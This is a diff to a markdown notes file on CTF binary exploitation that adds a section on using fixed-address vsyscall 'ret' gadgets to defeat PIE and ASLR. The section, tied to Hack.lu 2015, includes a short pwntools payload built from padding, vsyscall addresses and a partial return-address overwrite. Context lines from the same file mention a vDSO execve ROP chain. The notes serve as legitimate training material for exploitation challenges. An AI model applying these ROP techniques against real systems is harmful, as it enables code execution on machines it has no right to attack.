@@ -15,6 +15,7 @@
   - [Step 3 — Find vDSO base via AT_SYSINFO_EHDR](#step-3--find-vdso-base-via-at_sysinfo_ehdr)
   - [Step 4 — Dump vDSO and find gadgets](#step-4--dump-vdso-and-find-gadgets)
   - [Step 5 — execve ROP chain](#step-5--execve-rop-chain)
+- [Vsyscall ROP for PIE Bypass (Hack.lu 2015)](#vsyscall-rop-for-pie-bypass-hacklu-2015)
 - [Useful Commands](#useful-commands)
 
 For core ROP chain building, ret2csu, bad character bypass, exotic gadgets, and stack pivot via xchg, see [rop-and-shellcode.md](rop-and-shellcode.md).
@@ -306,6 +307,31 @@ payload += p64(MOV_RDI_RBX_SYSCALL)
 **Key insight:** The vDSO is kernel-specific — different kernels have different gadget offsets. Always dump the remote vDSO rather than assuming local offsets. The auxv `AT_SYSINFO_EHDR` (type 0x21) on the stack is the reliable way to find the vDSO base address.
 
 **Detection:** Statically-linked binary with few functions, no libc, and no useful gadgets. QEMU-hosted challenges often run custom kernels with unique vDSO layouts.
+
+---
+
+## Vsyscall ROP for PIE Bypass (Hack.lu 2015)
+
+On older Linux kernels, vsyscall page is mapped at a fixed address (`0xffffffffff600000-0xffffffffff601000`) regardless of ASLR/PIE. Each vsyscall entry ends with `ret`, providing gadgets at known addresses:
+
+- `0xffffffffff600000` — gettimeofday (ret at +0x9)
+- `0xffffffffff600400` — time (ret at +0x9)
+- `0xffffffffff600800` — getcpu (ret at +0x9)
+
+Use vsyscall `ret` gadgets to slide the stack to a partial return address overwrite:
+
+```python
+from pwn import *
+
+payload = b'A' * 72                      # padding to return address
+payload += p64(0xffffffffff600400)        # vsyscall time: acts as NOP-ret
+payload += p64(0xffffffffff600400)        # second NOP-ret for alignment
+payload += b"\x8b\x10"                    # partial overwrite to target (2 bytes)
+```
+
+**Key insight:** Vsyscall addresses are fixed even with PIE+ASLR. Modern kernels emulate vsyscalls (trap to kernel), but the addresses remain predictable. Check with `cat /proc/self/maps | grep vsyscall`.
+
+**Note:** Some newer kernels disable vsyscall entirely (`vsyscall=none`). Verify availability before relying on this technique.
 
 ---
 
